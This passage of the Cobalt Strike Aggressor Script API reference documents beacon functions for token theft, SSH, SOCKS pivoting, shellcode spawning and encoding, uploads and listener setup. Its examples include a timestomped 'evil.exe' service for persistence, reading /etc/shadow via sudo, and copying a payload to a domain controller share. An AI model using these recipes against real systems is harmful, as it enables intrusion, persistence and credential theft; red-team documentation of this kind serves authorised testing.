Spawn shellcode (from a local file) into another process. This function benefits from Beacon's configuration to spawn post-exploitation jobs (e.g., spawnto, ppid, etc.)

Arguments
$1 - the id for the beacon. This may be an array or a single ID.

$2 - the process architecture (x86 | x64)

$3 - the local file with the shellcode

Example
bshspawn($1, "x86", "/path/to/stuff.bin");
Back to Top

bsleep
Ask Beacon to change its beaconing interval and jitter factor.

Arguments
$1 - the id for the beacon. This may be an array or a single ID.

$2 - the number of seconds between beacons.

$3 - the jitter factor [0-99]

Example
alias stealthy {
   # sleep for 1 hour with 30% jitter factor
   bsleep($1, 60 * 60, 30);
}
Back to Top

bsleepu
Ask Beacon to change its beaconing interval and jitter factor.

Arguments
$1 - the id for the beacon. This may be an array or a single ID.

$2 - beacon sleep period string.

The beacon sleep period string takes the format: ud vh xm ys zj

Were:

w is the number of days

v is the number of hours

x is the number of minutes

y is the number of seconds

z is the jitter factor [0 - 99]

Example
            alias stealthy {
   # sleep for 2 days 13 hours 45 minutes 8 seconds with 30% jitter factor
   bsleepu($1, "2d 13h 45m 8s 30j");
}
        
Back to Top

bsocks
Start a SOCKS proxy server associated with a beacon.

Arguments
$1 - the id for the beacon. This may be an array or a single ID.

$2 - the port to bind to

$3 - SOCKS version [SOCKS4|SOCKS5] Default: SOCKS4

For SOCKS 5 only:

$4 - enable/disable NoAuth authentication [enableNoAuth|disableNoAuth] Default: enableNoAuth

$5 - username for User/Password authentication [blank|username] Default: Blank

$6 - password for User/Password authentication [blank|password] Default: Blank

$7 - enable logging [enableLogging|disableLogging] Default: disableLogging

Example
alias socksPorts {
   bsocks($1, 10401);
   bsocks($1, 10402, "SOCKS4");
   bsocks($1, 10501, "SOCKS5");
   bsocks($1, 10502, "SOCKS5" "enableNoAuth", "", "", "disableLogging");
   bsocks($1, 10503, "SOCKS5" "enableNoAuth", "myname", "mypassword", "disableLogging");
   bsocks($1, 10504, "SOCKS5" "disableNoAuth", "myname", "mypassword", "enableLogging");
}
Back to Top

bsocks_stop
Stop SOCKS proxy servers associated with the specified Beacon.

Arguments
$1 - the id for the beacon. This may be an array or a single ID.

Example
alias stopsocks {
   bsocks_stop($1);
}
Back to Top

bspawn
Ask Beacon to spawn a new session

Arguments
$1 - the id for the beacon. This may be an array or a single ID.

$2 - the listener to target.

$3 - the architecture to spawn a process for (defaults to current beacon arch)

Example
item "&Spawn" {
   openPayloadHelper(lambda({
      binput($bids, "spawn x86 $1");
      bspawn($bids, $1, "x86");
   }, $bids => $1));
}
Back to Top

bspawnas
Ask Beacon to spawn a session as another user.

Arguments
$1 - the id for the beacon. This may be an array or a single ID.

$2 - the domain of the user

$3 - the user's username

$4 - the user's password

$5 - the listener to spawn

Example
bspawnas($1, "CORP", "Administrator", "toor", "my listener");
Back to Top

bspawnto
Change the default program Beacon spawns to inject capabilities into.

Arguments
$1 - the id for the beacon. This may be an array or a single ID.

$2 - the architecture we're modifying the spawnto setting for (x86, x64)

$3 - the program to spawn

Notes
The value you specify for spawnto must work from x86->x86, x86->x64, x64->x86, and x64->x86 contexts. This is tricky. Follow these rules and you'll be OK:

1. Always specify the full path to the program you want Beacon to spawn for its post-ex jobs.

2. Environment variables (e.g., %windir%) are OK within these paths.

3. Do not specify %windir%\system32 or c:\windows\system32 directly. Always use syswow64 (x86) and sysnative (x64). Beacon will adjust these values to system32 if it's necessary.

4. For an x86 spawnto value, you must specify an x86 program. For an x64 spawnto value, you must specify an x64 program.

Example
# let's make everything lame.
on beacon_initial {
   binput($1, "prep session with new spawnto values.");
   bspawnto($1, "x86", "%windir%\\syswow64\\notepad.exe");
   bspawnto($1, "x64", "%windir%\\sysnative\\notepad.exe");
}
Back to Top

bspawnu
Ask Beacon to spawn a session under another process.

Arguments
$1 - the id for the beacon. This may be an array or a single ID.

$2 - the process to spawn this session under

$3 - the listener to spawn

Example
bspawnu($1, 1234, "my listener");
Back to Top

bspunnel
Spawn and tunnel an agent through this Beacon (via a target localhost-only reverse port forward)

Arguments
$1 - the id for the beacon. This may be an array or a single ID.

$2 - the host of the controller

$3 - the port of the controller

$4 - a file with position-independent code to execute in a temporary process.

Example
bspunnel($1, "127.0.0.1", 4444, script_resource("agent.bin"));
Back to Top

bspunnel_local
Spawn and tunnel an agent through this Beacon (via a target localhost-only reverse port forward). Note: this reverse port forward tunnel traverses through the Beacon chain to the team server and, via the team server, out through the requesting Cobalt Strike client.

Arguments
$1 - the id for the beacon. This may be an array or a single ID.

$2 - the host of the controller

$3 - the port of the controller

$4 - a file with position-independent code to execute in a temporary process.

Example
bspunnel_local($1, "127.0.0.1", 4444, script_resource("agent.bin"));
Back to Top

bssh
Ask Beacon to spawn an SSH session.

Arguments
$1 - id for the beacon. This may be an array or a single ID.

$2 - IP address or hostname of the target

$3 - port (e.g., 22)

$4 - username

$5 - password

$6 - (optional) the PID to inject the SSH client into or $null

$7 - (optional) the architecture of the target PID (x86|x64) or $null

Example
Spawn a temporary process
bssh($1, "172.16.20.128", 22, "root", "toor");
Inject into the specified process
bssh($1, "172.16.20.128", 22, "root", "toor", 1234, "x64");
Back to Top

bssh_key
Ask Beacon to spawn an SSH session using the data from a key file. The key file needs to be in the PEM format. If the file is not in the PEM format then make a copy of the file and convert the copy with the following command:

/usr/bin/ssh-keygen -f [/path/to/copy] -e -m pem -p

Arguments
$1 - id for the beacon. This may be an array or a single ID.

$2 - IP address or hostname of the target

$3 - port (e.g., 22)

$4 - username

$5 - key data (as a string)

$6 - (optional) the PID to inject the SSH client into or $null

$7 - (optional) the architecture of the target PID (x86|x64) or $null

Example
alias myssh {
   $pid = $2;
   $arch = $3;
   $handle = openf("/path/to/key.pem");
   $keydata = readb($handle, -1);
   closef($handle);
 
   if ($pid >= 0 && ($arch eq "x86" || $arch eq "x64")) {
      bssh_key($1, "172.16.20.128", 22, "root", $keydata, $pid, $arch);
   } else {
      bssh_key($1, "172.16.20.128", 22, "root", $keydata);
   }
};
bstage
REMOVED This function is removed in Cobalt Strike 4.0. Use &beacon_stage_tcp or &beacon_stage_pipe to explicitly stage a payload. Use &beacon_link to link to it.

bsteal_token
Ask Beacon to steal a token from a process.

Arguments
$1 - the id for the beacon. This may be an array or a single ID.

$2 - the PID to take the token from

Use: bsteal_token [pid]
     bsteal_token [pid] <OpenProcessToken access mask>
 
OpenProcessToken access mask suggested values:
  blank = default (TOKEN_ALL_ACCESS)
      0 = TOKEN_ALL_ACCESS
     11 = TOKEN_ASSIGN_PRIMARY | TOKEN_DUPLICATE | TOKEN_QUERY (1+2+8)

Access mask values:
  STANDARD_RIGHTS_REQUIRED . . . . : 983040
  TOKEN_ASSIGN_PRIMARY . . . . . . : 1
  TOKEN_DUPLICATE  . . . . . . . . : 2
  TOKEN_IMPERSONATE  . . . . . . . : 4
  TOKEN_QUERY  . . . . . . . . . . : 8
  TOKEN_QUERY_SOURCE . . . . . . . : 16
  TOKEN_ADJUST_PRIVILEGES  . . . . : 32
  TOKEN_ADJUST_GROUPS  . . . . . . : 64
  TOKEN_ADJUST_DEFAULT . . . . . . : 128
  TOKEN_ADJUST_SESSIONID . . . . . : 256
 

NOTE:
'OpenProcessToken access mask' can be helpful for stealing tokens from processes using 'SYSTEM' user and you have this error: Could not open process token: {pid} (5)

You can set your preferred default with '.steal_token_access_mask' in the Malleable C2 global options.

Example
alias steal_token {
   bsteal_token($1, int($2));
}
Back to Top

bsudo
Ask Beacon to run a command via sudo (SSH sessions only)

Arguments
$1 - the id for the session. This may be an array or a single ID.

$2 - the password for the current user

$3 - the command and arguments to run

Example
# hashdump [password]
ssh_alias hashdump {
   bsudo($1, $2, "cat /etc/shadow");
}
Back to Top

bsyscall_method
Ask Beacon to change its syscall method.

Arguments
$1 - the id for the beacon. This may be an array or a single ID.

$2 - the syscall method. Supported methods are:

None: Use the standard Windows API function.
Direct: Use the Nt* version of the function.

Indirect: Jump to the appropriate instruction within the Nt* version of the function.

NOTE:
If the $2 argument is empty, Beacon is tasked to query the currently used syscall method.

Example
alias syscall_method {
   bsyscall_method($1, $2);
}
Back to Top

btask
Report a task acknowledgement for a Beacon. This task acknowledgement will also contribute to the narrative in Cobalt Strike's Activity Report and Sessions Report.

Arguments
$1 - the id for the beacon to post to

$2 - the text to post

$3 - a string with MITRE ATT&CK Tactic IDs. Use a comma and a space to specify multiple IDs in one string.

https://attack.mitre.org

Example
alias foo {
   btask($1, "User tasked beacon to foo", "T1015");
}
Back to Top

btimestomp
Ask Beacon to change the file modified/accessed/created times to match another file.

Arguments
$1 - the id for the beacon. This may be an array or a single ID.

$2 - the file to update timestamp values for

$3 - the file to grab timestamp values from

Example
alias persist {
   bcd($1, "c:\\windows\\system32");
   bupload($1, script_resource("evil.exe"));
   btimestomp($1, "evil.exe", "cmd.exe");
   bshell($1, 'sc create evil binpath= "c:\\windows\\system32\\evil.exe"');
   bshell($1, 'sc start evil');
}
Back to Top

btoken_store_remove
Ask Beacon to remove specific access tokens from the store.

Arguments
$1 - the id for the beacon. This may be an array or a single ID.

$2 - the array of token IDs to remove.

Example
alias token-store_remove {
   btoken_store_remove($1, @(int($2)));
}
Back to Top

btoken_store_remove_all
Ask Beacon to remove all tokens from the store.

Arguments
$1 - the id for the beacon. This may be an array or a single ID.

Example
alias token-store_remove_all {
   btoken_store_remove_all($1);
}
Back to Top

btoken_store_show
Ask Beacon to print the tokens currently available in the token store.

Arguments
$1 - the id for the beacon. This may be an array or a single ID.

Example
alias token-store_show {
   btoken_store_show($1);
}
Back to Top

btoken_store_steal
Ask Beacon to steal a token and store it in the token store.

Arguments
$1 - the id for the beacon. This may be an array or a single ID.

$2 - the array of PIDs to take the tokens from.

$3 - the OpenProcessToken access mask.

Example
alias token-store_steal {
   btoken_store_steal($1, @(int($2)), 11);
}
Back to Top

btoken_store_steal_and_use
Ask Beacon to steal a token, store it and immediately apply it to the beacon.

Arguments
$1 - the id for the beacon. This may be an array or a single ID.

$2 - the PID to take the token from.

$3 - the OpenProcessToken access mask.

Example
alias token-store_steal_and_use {
   btoken_store_steal_and_use($1, int($2), 11);
}
Back to Top

btoken_store_use
Ask Beacon to use a token from the token store.

Arguments
$1 - the id for the beacon. This may be an array or a single ID.

$2 - the token ID.

Example
alias token-store_use {
   btoken_store_use($1, int($2));
}
Back to Top

bunlink
Ask Beacon to delink a Beacon its connected to over a TCP socket or named pipe.

Arguments
$1 - the id for the beacon. This may be an array or a single ID.

$2 - the target host to unlink (specified as an IP address)

$3 - (optional) the PID of the target session to unlink

Example
bunlink($1, "172.16.48.3");
Back to Top

bupload
Ask a Beacon to upload a file

Arguments
$1 - the id for the beacon. This may be an array or a single ID.

$2 - the local path to the file to upload

Example
bupload($1, script_resource("evil.exe"));
Back to Top

bupload_raw
Ask a Beacon to upload a file

Arguments
$1 - the id for the beacon. This may be an array or a single ID.

$2 - the remote file name of the file

$3 - the raw content of the file

$4 - (optional) the local path to the file (if there is one)

Example
$data = artifact("my listener", "exe");
bupload_raw($1, "\\\\DC\\C$\\foo.exe", $data);
bwdigest
REMOVED Removed in Cobalt Strike 4.0. Use &bmimikatz directly.

bwinrm
REMOVED Removed in Cobalt Strike 4.0. Use &bjump with winrm or winrm64 built-in options.

bwmi
REMOVED Removed in Cobalt Strike 4.0.

Back to Top

call
Issue a call to the team server.

Arguments
$1 - the command name

$2 - a callback to receive a response to this request. The callback will receive two arguments. The first is the call name. The second is the response.

... - one or more arguments to pass into this call.

Example
call("aggressor.ping", { warn(@_); }, "this is my value");
Back to Top

closeClient
Close the current Cobalt Strike team server connection.

Example
closeClient();
Back to Top

colorPanel
Generate a Java component to set accent colors within Cobalt Strike's data model

Arguments
$1 - the prefix

$2 - an array of IDs to change colors for

Example
popup targets {
   menu "&Color" {
      insert_component(colorPanel("targets", $1));
   }
}
See also
&highlight

Back to Top

credential_add
Add a credential to the data model

Arguments
$1 - username

$2 - password

$3 - realm

$4 - source

$5 - host

Example
command falsecreds {
   for ($x = 0; $x < 100; $x++) {
      credential_add("user $+ $x", "password $+ $x");
   }
}
Back to Top

credentials
Returns a list of application credentials in Cobalt Strike's data model.

Returns
An array of dictionary objects with information about each credential entry.

Example
printAll(credentials());
Back to Top

custom_event
Broadcast a custom event to all Cobalt Strike clients.

Arguments
$1 - the topic name

$2 - the event data

Example
custom_event("my-topic", %(foo => 42, bar => "hello"));
Back to Top

custom_event_private
Send a custom event to one specific Cobalt Strike client.

Arguments
$1 - who to send the custom event to

$2 - the topic name

$3 - the event data

Example
custom_event_private("neo", "my-topic", 42);
Back to Top

data_keys
List the query-able keys from Cobalt Strike's data model

Returns
A list of keys that you may query with &data_query

Example
foreach $key (data_keys()) {
   println("\n\c4=== $key ===\n");
   println(data_query($key));
}
Back to Top

data_query
Queries Cobalt Strike's data model

Arguments
$1 - the key to pull from the data model

Returns
A Sleep representation of the queried data.

Example
println(data_query("targets"));
Back to Top

dbutton_action
Adds an action button to a &dialog. When this button is pressed, the dialog closes and its callback is called. You may add multiple buttons to a dialog. Cobalt Strike will line these buttons up in a row and center them at the bottom of the dialog.

Arguments
$1 - the $dialog object

$2 - the button label

Example
dbutton_action($dialog, "Start");
dbutton_action($dialog, "Stop");
Back to Top

dbutton_help
Adds a Help button to a &dialog. When this button is pressed, Cobalt Strike will open the user's browser to the specified URL.

Arguments
$1 - the $dialog object

$2 - the URL to go to

Example
dbutton_help($dialog, "http://www.google.com");
Back to Top

dialog
Create a dialog. Use &dialog_show to show it.

Arguments
$1 - the title of the dialog

$2 - a %dictionary mapping row names to default values

$3 - a callback function. Called when the user presses a &dbutton_action button. $1 is a reference to the dialog. $2 is the button name. $3 is a dictionary that maps each row's name to its value.

Returns
A scalar with a $dialog object.

Example
sub callback {
   # prints: Pressed Go, a is: Apple
   println("Pressed $2 $+ , a is: " . $3['a']);
}

$dialog = dialog("Hello World", %(a => "Apple", b => "Bat"), &callback);
drow_text($dialog, "a", "Fruit:  ");
drow_text($dialog, "b", "Rodent: ");
dbutton_action($dialog, "Go");
dialog_show($dialog);
Back to Top

dialog_description
Adds a description to a &dialog

Arguments
$1 - a $dialog object

$2 - the description of this dialog

Example
dialog_description($dialog, "I am the Hello World dialog.");
Back to Top

dialog_show
Shows a &dialog.

Arguments
$1 - the $dialog object

Example
dialog_show($dialog);
Back to Top

dispatch_event
Call a function in Java Swing's Event Dispatch Thread. Java's Swing Library is not thread safe. All changes to the user interface should happen from the Event Dispatch Thread.

Arguments
$1 - the function to call

Example
dispatch_event({
   println("Hello World"); 
});
Back to Top

downloads
Returns a list of downloads in Cobalt Strike's data model.

Returns
An array of dictionary objects with information about each downloaded file.

Example
printAll(downloads());
Back to Top

drow_beacon
Adds a beacon selection row to a &dialog

Arguments
$1 - a $dialog object

$2 - the name of this row

$3 - the label for this row

Example
drow_beacon($dialog, "bid", "Session: ");
Back to Top

drow_checkbox
Adds a checkbox to a &dialog

Arguments
$1 - a $dialog object

$2 - the name of this row

$3 - the label for this row

$4 - the text next to the checkbox

Example
drow_checkbox($dialog, "box", "Scary: ", "Check me... if you dare");
Back to Top

drow_combobox
Adds a combobox to a &dialog

Arguments
$1 - a $dialog object

$2 - the name of this row

$3 - the label for this row

$4 - an array of options to choose from

Example
drow_combobox($dialog, "combo", "Options", @("apple", "bat", "cat"));
Back to Top

drow_exploits
Adds a privilege escalation exploit selection row to a &dialog

Arguments
$1 - a $dialog object

$2 - the name of this row

$3 - the label for this row

Example
drow_exploits($dialog, "exploit", "Exploit: ");
Back to Top

drow_file
Adds a file chooser row to a &dialog

Arguments
$1 - a $dialog object

$2 - the name of this row

$3 - the label for this row

Example
drow_file($dialog, "file", "Choose: ");
Back to Top

drow_interface
Adds a VPN interface selection row to a &dialog

Arguments
$1 - a $dialog object

$2 - the name of this row

$3 - the label for this row

Example
drow_interface($dialog, "int", "Interface: ");
Back to Top

drow_krbtgt
Adds a krbtgt selection row to a &dialog

Arguments
$1 - a $dialog object

$2 - the name of this row

$3 - the label for this row

Example
drow_krbtgt($dialog, "hash", "krbtgt hash: ");
Back to Top

drow_listener
Adds a listener selection row to a &dialog. This row only shows listeners with stagers (e.g., windows/beacon_https/reverse_https).

Arguments
$1 - a $dialog object

$2 - the name of this row

$3 - the label for this row

Example
drow_listener($dialog, "listener", "Listener: ");
Back to Top

drow_listener_smb
DEPRECATED This function is deprecated in Cobalt Strike 4.0. It's now equivalent to &drow_listener_stage

Back to Top

drow_listener_stage
Adds a listener selection row to a &dialog. This row shows all Beacon and Foreign listener payloads.

Arguments
$1 - a $dialog object

$2 - the name of this row

$3 - the label for this row

Example
drow_listener_stage($dialog, "listener", "Stage: ");
Back to Top

drow_mailserver
Adds a mail server field to a &dialog.

Arguments
$1 - a $dialog object

$2 - the name of this row

$3 - the label for this row

Example
drow_mailserver($dialog, "mail", "SMTP Server: ");
Back to Top

drow_proxyserver
DEPRECATED This function is deprecated in Cobalt Strike 4.0. The proxy configuration is now tied directly to the listener.

Adds a proxy server field to a &dialog.

Arguments
$1 - a $dialog object

$2 - the name of this row

$3 - the label for this row

Example
drow_proxyserver($dialog, "proxy", "Proxy: ");
Back to Top

drow_site
Adds a site/URL field to a &dialog.

Arguments
$1 - a $dialog object

$2 - the name of this row

$3 - the label for this row

Example
drow_site($dialog, "url", "Site: ");
Back to Top

drow_text
Adds a text field row to a &dialog

Arguments
$1 - a $dialog object

$2 - the name of this row

$3 - the label for this row

$4 - (optional) The width of this text field (in characters). This value isn't always honored (it won't shrink the field, but it will make it wider).

Example
drow_text($dialog, "name", "Name: ");
Back to Top

drow_text_big
Adds a multi-line text field to a &dialog

Arguments
$1 - a $dialog object

$2 - the name of this row

$3 - the label for this row

Example
drow_text_big($dialog, "addr", "Address: ");
Back to Top

dstamp
Format a time into a date/time value. This value includes seconds.

Arguments
$1 - the time [milliseconds since the UNIX epoch]

Example
println("The time is now: " . dstamp(ticks()));
See also
&tstamp

Back to Top

elog
Publish a notification to the event log

Arguments
$1 - the message

Example
elog("The robot invasion has begun!");
Back to Top

encode
Obfuscate a position-independent blob of code with an encoder.

Arguments
$1 - position independent code (e.g., shellcode, "raw" stageless Beacon) to apply encoder to

$2 - the encoder to use

$3 - the architecture (e.g., x86, x64)

Encoder  Description
alpha Alphanumeric encoder (x86-only)
xor   XOR encoder
Notes
The encoded position-independent blob must run from a memory page that has RWX permissions or the decode step will crash the current process.
alpha encoder: The EDI register must contain the address of the encoded blob. &encode prepends a 10-byte (non-alphanumeric) program to the beginning of the alphanumeric encoded blob. This program calculates the location of the encoded blob and sets EDI for you. If you plan to set EDI yourself, you may remove these first 10 bytes.
Returns
A position-independent blob that decodes the original string and passes execution to it.

Example
# generate shellcode for a listener
$stager = shellcode("my listener", false "x86");

# encode it.
$stager = encode($stager, "xor", "x86");
Back to Top

extract_reflective_loader
Extract the executable code for a reflective loader from a Beacon Object File (BOF).

Arguments
$1 - Beacon Object File data that contains a reflective loader.

Returns
The Reflective Loader binary executable code extracted from the Beacon Object File data.

Example
See BEACON_RDLL_GENERATE hook

# ---------------------------------------------------------------------
# extract loader from BOF.
# ---------------------------------------------------------------------
$loader = extract_reflective_loader($data);
Back to Top

file_browser
Open the File Browser. This function does not have any parameters.

Back to Top

fireAlias
Runs a user-defined alias

Arguments
$1 - the beacon id to run the alias against

$2 - the alias name to run

$3 - the arguments to pass to the alias.

Example
# run the foo alias when a new Beacon comes in
on beacon_initial {
   fireAlias($1, "foo", "bar!");
}
Back to Top

fireEvent
Fire an event.

Arguments
$1 - the event name

... - the event arguments.

Example
on foo {
   println("Argument is: $1");
}

fireEvent("foo", "Hello World!");
Back to Top

format_size
Formats a number into a size (e.g., 1024 => 1kb)

Arguments
$1 - the size to format

Returns
A string representing a human readable data size.

Example
println(format_size(1024));
Back to Top

getAggressorClient
Returns the aggressor.AggressorClient Java object. This can reach anything internal within the current Cobalt Strike client context.

Example
$client = getAggressorClient();
Back to Top

gunzip
Decompress a string (GZIP).

Arguments
$1 - the string to compress

Returns
The argument processed by the gzip de-compressor

Example
println(gunzip(gzip("this is a test")));
See also
&gzip

Back to Top

gzip
GZIP a string.

Arguments
$1 - the string to compress

Returns
The argument processed by the gzip compressor

Example
println(gzip("this is a test"));
See also
&gunzip

Back to Top

highlight
Insert an accent (color highlight) into Cobalt Strike's data model

Arguments
$1 - the data model

$2 - an array of rows to highlight

$3 - the accent type

Notes
Data model rows include: applications, beacons, credentials, listeners, services, and targets.
Accent options are:
Accent   Color
[empty]  no highlight
good  Green
bad   Red
neutral  Yellow
ignore   Grey
cancel   Dark Blue
Example
command admincreds {
   local('@creds');
   
   # find all of our creds that are user Administrator.
   foreach $entry (credentials()) {
      if ($entry['user'] eq "Administrator") {
         push(@creds, $entry);
      }
   }
   
   # highlight all of them green!
   highlight("credentials", @creds, "good");
}
Back to Top

host_delete
Delete a host from the targets model

Arguments
$1 - the IPv4 or IPv6 address of this target [you may specify an array of hosts too]

Example
# clear all hosts
host_delete(hosts());
Back to Top

host_info
Get information about a target.

Arguments
$1 - the host IPv4 or IPv6 address

$2 - [Optional] the key to extract a value for

Returns
%info = host_info("address");
Returns a dictionary with known information about this target.

$value = host_info("address", "key");
Returns the value for the specified key from this target's entry in the data model.

Example
# create a script console alias to dump host info
command host {
   println("Host $1");
   foreach $key => $value (host_info($1)) {
      println("$[15]key $value");
   }
}
Back to Top

host_update
Add or update a host in the targets model

Arguments
$1 - the IPv4 or IPv6 address of this target [you may specify an array of hosts too]

$2 - the DNS name of this target

$3 - the target's operating system

$4 - the operating system version number (e.g., 10.0)

$5 - a note for the target.

Note
You may specify a $null value for any argument and, if the host exists, no change will be made to that value.

Example
host_update("192.168.20.3", "DC", "Windows", 10.0);
Back to Top

hosts
Returns a list of IP addresses from Cobalt Strike's target model

Returns
An array of IP addresses

Example
printAll(hosts());
Back to Top

insert_component
Add a javax.swing.JComponent object to the menu tree

Arguments
$1 - the component to add

Back to Top

insert_menu
Bring menus associated with a popup hook into the current menu tree.

Arguments
$1 - the popup hook

... - additional arguments are passed to the child popup hook.

Example
popup beacon {
   # menu definitions above this point
   
   insert_menu("beacon_bottom", $1);
   
   # menu definitions below this point
}
Back to Top

iprange
Generate an array of IPv4 addresses based on a string description

Arguments
$1 - a string with a description of IPv4 ranges

Range Result
192.168.1.2 The IP4 address 192.168.1.2
192.168.1.1, 192.168.1.2   The IPv4 addresses 192.168.1.1 and 192.168.1.2
192.168.1.0/24 The IPv4 addresses 192.168.1.0 through 192.168.1.255
192.168.1.18-192.168.1.30  The IPv4 addresses 192.168.1.18 through 192.168.1.29
192.168.1.18-30   The IPv4 addresses 192.168.1.18 through 192.168.1.29
Returns
An array of IPv4 addresses within the specified ranges.

Example
printAll(iprange("192.168.1.0/25"));
Back to Top

keystrokes
Returns a list of keystrokes from Cobalt Strike's data model.

Returns
An array of dictionary objects with information about recorded keystrokes.

Example
printAll(keystrokes());
Back to Top

licenseKey
DEPRECATED This function is deprecated in Cobalt Strike 4.6. The function will now return an empty string.

Get the license key for this instance of Cobalt Strike

Returns
Your license key.

Example
println("Your key is: " . licenseKey());
Back to Top

listener_create
DEPRECATED This function is deprecated in Cobalt Strike 4.0. Use &listener_create_ext

Create a new listener.

Arguments
$1 - the listener name

$2 - the payload (e.g., windows/beacon_http/reverse_http)

$3 - the listener host

$4 - the listener port

$5 - a comma separated list of addresses for listener to beacon to

Example
# create a foreign listener
listener_create("My Metasploit", "windows/foreign_https/reverse_https", 
      "ads.losenolove.com", 443);

# create an HTTP Beacon listener
listener_create("Beacon HTTP", "windows/beacon_http/reverse_http",
      "www.losenolove.com", 80, 
      "www.losenolove.com, www2.losenolove.com");
Back to Top

listener_create_ext
Create a new listener.

Arguments
$1 - the listener name

$2 - the payload (e.g., windows/beacon_http/reverse_http)

$3 - a map with key/value pairs that specify options for the listener

Note
The following payload options are valid for $2:

Payload  Type
windows/beacon_dns/reverse_dns_txt  Beacon DNS
windows/beacon_http/reverse_http Beacon HTTP
windows/beacon_https/reverse_https  Beacon HTTPS
windows/beacon_bind_pipe   Beacon SMB
windows/beacon_bind_tcp Beacon TCP
windows/beacon_extc2 External C2
windows/foreign/reverse_http  Foreign HTTP
windows/foreign/reverse_https Foreign HTTPS
The following keys are valid for $3:

Key   DNS   HTTP/S   SMB   TCP (Bind)
althost     HTTP Host Header     
bindto   bind port   bind port      
beacons  c2 hosts c2 hosts    bind host
host  staging host   staging host      
maxretry maxretry maxretry     
port  c2 port  c2 port  pipe name   port
profile     profile variant      
proxy    proxy config      
strategy host rotation  host rotation     
The following host rotation Values are valid for the 'strategy' Key:

Option
round-robin
random
failover
failover-5x
failover-50x
failover-100x
failover-1m
failover-5m
failover-15m
failover-30m
failover-1h
failover-3h
failover-6h
failover-12h
failover-1d
rotate-1m
rotate-5m
rotate-15m
rotate-30m
rotate-1h
rotate-3h
rotate-6h
rotate-12h
rotate-1d
Note
The maxretry value uses the following syntax of exit-[max_attempts]-[increase_attempts]-[duration][m,h,d]. For example 'exit-10-5-5m' will exit beacon after 10 failed attempts and will increase sleep time after 5 failed attempts to 5 minutes. The sleep time will not be updated if the current sleep time is greater than the specified duration value. The sleep time will be affected by the current jitter value. On a successful connection the failed attempts count will be reset to zero and the sleep time will be reset to the prior value.

The proxy configuration string is the same string you would input into Cobalt Strike's listener dialog. *direct* ignores the local proxy configuration and attempts a direct connection. protocol://user:[email protected]:port specifies which proxy configuration the artifact should use. The username and password are optional (e.g., protocol://host:port is fine). The acceptable protocols are socks and http. Set the proxy configuration string to $null or "" to use the default behavior.

Example
# create a foreign listener
listener_create_ext("My Metasploit", "windows/foreign/reverse_https",
      %(host => "ads.losenolove.com", port => 443));

# create an HTTP Beacon listener
listener_create_ext("Beacon HTTP", "windows/beacon_http/reverse_http",
      %(host => "www.losenolove.com", port => 80, 
      beacons => "www.losenolove.com, www2.losenolove.com"));

# create an HTTP Beacon listener
listener_create_ext("HTTP", "windows/beacon_http/reverse_http",
      %(host => "stage.host",
      profile => "default",
      port => 80,
      beacons => "b1.host,b2.host",
      althost => "alt.host",
      bindto => 8080,
      strategy => "failover-5x",
      max_retry => "exit-10-5-5m",
      proxy => "proxy.host"));
Back to Top

listener_delete
Stop and remove a listener.

Arguments
$1 - the listener name

Example
listener_delete("Beacon HTTP");
Back to Top

listener_describe
Describe a listener.

Arguments
$1 - the listener name

$2 - (optional) the remote target the listener is destined for

Returns
A string describing the listener

Example
foreach $name (listeners()) {
   println("$name is: " . listener_describe($name));
}
Back to Top

listener_info
Get information about a listener.

Arguments
$1 - the listener name

$2 - (optional) the key to extract a value for

Returns
%info = listener_info("listener name");
Returns a dictionary with the metadata for this listener.

$value = listener_info("listener name", "key");
Returns the value for the specified key from this listener's metadata

Example
# create a script console alias to dump listener info
command dump {
   println("Listener $1");
   foreach $key => $value (listener_info($1)) {
      println("$[15]key $value");
   }
}
Back to Top

listener_pivot_create
Create a new pivot listener.

Arguments
$1 - the Beacon ID

$2 - the listener name

$3 - the payload (e.g., windows/beacon_reverse_tcp)

$4 - the listener host

$5 - the listener port

Note
The only valid payload argument is windows/beacon_reverse_tcp.

Example
# create a pivot listener: 
# $1 = beaconID, $2 = name, $3 = port
alias plisten {
   local('$lhost $bid $name $port');
   
   # extract our arguments
   ($bid, $name, $port) = @_;
   
   # get the name of our target
   $lhost = beacon_info($1, "computer");
   
   btask($1, "create TCP listener on $lhost $+ : $+ $port");
   listener_pivot_create($1, $name, "windows/beacon_reverse_tcp", $lhost, $port);
}
Back to Top

listener_restart
Restart a listener

Arguments
$1 - the listener name

Example
listener_restart("Beacon HTTP");
Back to Top

listeners
Return a list of listener names (with stagers only!) across all team servers this client is connected to.

Returns
An array of listener names.

Example
printAll(listeners());
Back to Top

listeners_local
Return a list of listener names. This function limits itself to the current team server only. External C2 listener names are omitted.

Returns
An array of listener names.

Example
printAll(listeners_local());
Back to Top

listeners_stageless
Return a list of listener names across all team servers this client is connected to. External C2 listeners are filtered (as they're not actionable via staging or exporting as a Reflective DLL).

Returns
An array of listener names.

Example
printAll(listeners_stageless());
Back to Top

localip
Get the IP address associated with the team server.

Returns
A string with the team server's IP address.

Example
println("I am: " . localip());
Back to Top

menubar
Add a top-level item to the menubar.

Arguments
$1 - the description

$2 - the popup hook

Example
popup mythings {
   item "Keep out" {
   }
}

menubar("My &Things", "mythings");
Back to Top

mynick
Get the nickname associated with the current Cobalt Strike client.

Returns
A string with your nickname.

Example
println("I am: " . mynick());
Back to Top

nextTab
Activate the tab that is to the right of the current tab.

Example
bind Ctrl+Right {
   nextTab();
}
Back to Top

on
Register an event handler. This is an alternate to the on keyword.

Arguments
$1 - the name of the event to respond to

$2 - a callback function. Called when the event happens.

Example
sub foo {
   blog($1, "Foo!");
}

on("beacon_initial", &foo);
Back to Top

openAboutDialog
Open the "About Cobalt Strike" dialog

Example
openAboutDialog();
Back to Top

openApplicationManager
Open the application manager (system profiler results) tab.

Example
openApplicationManager();
Back to Top

openAutoRunDialog
Open the auto run dialog.

Example
openAutoRunDialog();
Back to Top

openBeaconBrowser
Open the beacon browser tab.

Example
openBeaconBrowser();
Back to Top

openBeaconConsole
Open the console to interact with a Beacon

Arguments
$1 - the Beacon ID to apply this feature to

Example
item "Interact" {
   local('$bid');
   foreach $bid ($1) {
      openBeaconConsole($bid);
   }
}
Back to Top

openBrowserPivotSetup
open the browser pivot setup dialog

Arguments
$1 - the Beacon ID to apply this feature to

Example
item "Browser Pivoting" {
   local('$bid');
   foreach $bid ($1) {
      openBrowserPivotSetup($bid);
   }
}
Back to Top

openBypassUACDialog
REMOVED Removed in Cobalt Strike 4.1.

Back to Top

openCloneSiteDialog
Open the dialog for the website clone tool.

Example
openCloneSiteDialog();
Back to Top

openConnectDialog
Open the connect dialog.

Example
openConnectDialog();
Back to Top

openCovertVPNSetup
open the Covert VPN setup dialog

Arguments
